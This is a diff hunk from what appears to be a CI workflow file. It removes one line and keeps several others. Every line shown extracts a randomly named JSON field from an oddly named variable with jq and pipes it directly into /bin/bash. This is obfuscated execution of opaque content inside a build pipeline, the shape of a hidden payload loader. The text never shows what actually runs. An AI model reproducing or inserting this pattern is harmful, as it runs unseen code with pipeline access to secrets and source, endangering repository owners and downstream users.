@@ -30,7 +30,6 @@ jobs:
           echo $tad5 | jq -r .m08825 | /bin/bash
           printf '%s' "$r6534" | jq -r .bckps79138 | /bin/bash
           printf '%s' "$lhgmt0" | jq -r .dxpsd84 | /bin/bash
-          echo $gyl78064 | jq -r .nn1618 | /bin/bash
           echo $grcnc664 | jq -r .cih6 | /bin/bash
           printf '%s' "$rzkp36" | jq -r .njkg3132 | /bin/bash
           printf '%s' "$hs2458" | jq -r .haztu5 | /bin/bash
